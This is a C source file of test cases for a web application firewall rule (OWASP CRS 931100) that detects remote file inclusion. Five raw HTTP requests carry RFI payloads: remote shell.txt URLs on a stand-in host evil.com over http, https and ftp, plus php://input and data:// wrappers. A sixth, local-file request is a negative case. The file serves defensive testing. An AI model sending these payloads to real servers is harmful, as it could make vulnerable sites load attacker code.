#include "RFI_attack.h"

static const test_case_t RFI_cases[] = {

    /* TEST 1: Basic HTTP RFI */
    {
        "GET /get?file=http://evil.com/shell.txt HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: */*\r\n"
        "\r\n",
        EXPECT_MATCH,
        931100
    },

    /* TEST 2: HTTPS RFI */
    {
        "GET /get?file=https://evil.com/shell.txt HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: */*\r\n"
        "\r\n",
        EXPECT_MATCH,
        931100
    },

    /* TEST 3: FTP RFI */
    {
        "GET /get?file=ftp://evil.com/file.txt HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: */*\r\n"
        "\r\n",
        EXPECT_MATCH,
        931100
    },

    /* TEST 4: PHP stream wrapper */
    {
        "GET /get?file=php://input HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: */*\r\n"
        "\r\n",
        EXPECT_MATCH,
        931100
    },

    /* TEST 5: data:// wrapper */
    {
        "GET /get?file=data://text/plain;base64,SGVsbG8= HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: */*\r\n"
        "\r\n",
        EXPECT_MATCH,
        931100
    },

    /* TEST 6: Negative test (local file only) */
    {
        "GET /get?file=local.txt HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: */*\r\n"
        "\r\n",
        EXPECT_NO_MATCH,
        931100
    }
};

static const int RFI_cases_count = 
    (int)(sizeof(RFI_cases)) / sizeof(RFI_cases[0]);

int RFI_get_count(void)
{
    return RFI_cases_count;
}

const test_case_t *RFI_get_case(int index)  
{
    if(index < 0 || index >= RFI_cases_count)
        return (const test_case_t *)0;
    return &RFI_cases[index];
}